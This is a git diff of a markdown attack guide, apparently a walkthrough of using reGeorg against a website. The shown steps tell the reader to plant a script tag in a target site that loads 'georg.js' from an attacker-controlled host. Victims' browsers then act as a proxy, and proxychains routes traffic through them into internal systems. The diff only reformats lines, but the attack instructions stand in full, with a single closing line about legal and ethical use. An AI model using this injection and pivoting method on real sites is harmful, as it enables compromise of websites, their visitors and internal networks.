@@ -32,8 +32,8 @@ Replace <port_number> with the port on which you want the server to listen. The 
 
 ## Step 5: Prepare the payload
 
-    Identify the target website or application you want to attack.
-    Modify the source code of the target website or application to include a reference to the reGeorg script. For example, you can add the following line of code within a <script> tag:
+Identify the target website or application you want to attack.
+Modify the source code of the target website or application to include a reference to the reGeorg script. For example, you can add the following line of code within a <script> tag:
 
 ```
 <script src="http://<attacker_ip>:<port_number>/georg.js"></script>
@@ -53,3 +53,4 @@ Once the user's browser establishes a connection with your reGeorg server, you c
 For example, you can use tools like proxychains or socksify to route traffic through the reGeorg proxy, gaining access to internal systems or resources.
 
 **Remember to exercise caution and always follow legal and ethical guidelines when using such tools.**
+
